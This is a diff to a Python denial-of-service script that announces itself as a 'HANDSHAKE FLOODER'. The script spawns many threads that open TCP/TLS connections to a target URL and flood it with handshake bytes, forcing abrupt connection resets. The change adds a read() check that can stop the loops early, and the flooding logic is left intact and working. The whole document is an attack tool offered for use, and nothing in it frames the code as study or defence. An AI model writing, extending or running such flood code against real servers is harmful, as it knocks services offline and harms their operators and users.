@@ -1,10 +1,12 @@
 import socket,ssl,struct,threading
-from MODEL.data import get_target,generate_url_path
+from MODEL.data import get_target,generate_url_path,read
 
 def connection_flood(ssl_socket,a,byt,target):
   for _ in range(250):
+   if read() == True:break
    try:
      for _ in range(250):
+        if read() == True:break
         ssl_socket.sendall(byt[0]); ssl_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
         ssl_socket.sendall(byt[1]); ssl_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
    except:
@@ -17,6 +19,7 @@ def create_connection(target,m,times):
  try:
     path = 1
     for _ in range(times):
+     if read() == True:break
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.setblocking(1); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 255); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 1)
      s.connect(a); s.connect_ex(a)
@@ -40,4 +43,7 @@ else:
  print(f'WELCOME TO HANDSHAKE FLOODER\n{sys.argv[0]} <URL> <THREAD> <TIME> <METHODS>')
 target = get_target(url)
 for _ in range(int(thread_lower)):
-   for _ in range(10):threading.Thread(target=create_connection,args=(target,METHODS,time_booter)).start()
+   if read() == True:break
+   for _ in range(10):
+     if read() == True:break
+     threading.Thread(target=create_connection,args=(target,METHODS,time_booter)).start()
